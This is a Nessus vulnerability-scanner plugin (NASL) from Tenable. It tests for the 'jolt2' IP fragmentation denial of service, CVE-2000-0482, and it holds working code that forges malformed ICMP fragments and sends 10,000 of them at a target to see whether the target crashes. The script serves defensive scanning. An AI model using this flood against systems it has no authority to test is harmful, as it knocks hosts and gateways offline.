#
# (C) Tenable Network Security, Inc.
#

# Note: the original exploit looks buggy. I tried to reproduce it here.
#


include("compat.inc");

if(description)
{
 script_id(11902);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2000-0482");
 script_bugtraq_id(1312);
 script_xref(name:"OSVDB", value:"1379");

 script_name(english:"TCP/IP IP Fragmentation Remote DoS (jolt2)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The machine (or a gateway on the network path) crashed when flooded 
with incorrectly fragmented packets.
This is known as the 'jolt2' denial of service attack.

An attacker may use this flaw to shut down this server or router,
thus preventing you from working properly." );
 script_set_attribute(attribute:"solution", value:
"Contact your operating system vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

  script_summary(english:"Floods target with incorrectly fragmented packets");
 
 script_category(ACT_FLOOD);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);
if ( TARGET_IS_IPV6 ) exit(0);
src = this_host();
id = 0x455;
seq = rand() % 256;

ip = forge_ip_packet(ip_v: 4, ip_hl : 5, ip_tos : 0, ip_len : 20+8+1,
		     ip_id : id, ip_p : IPPROTO_ICMP, ip_ttl : 255,
		     ip_off : 8190, ip_src : src);

icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		 icmp_seq: seq, icmp_id:seq, data: "X");

start_denial();

send_packet(icmp, pcap_active: 0) x 10000;

alive = end_denial();
if(!alive)
{
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}
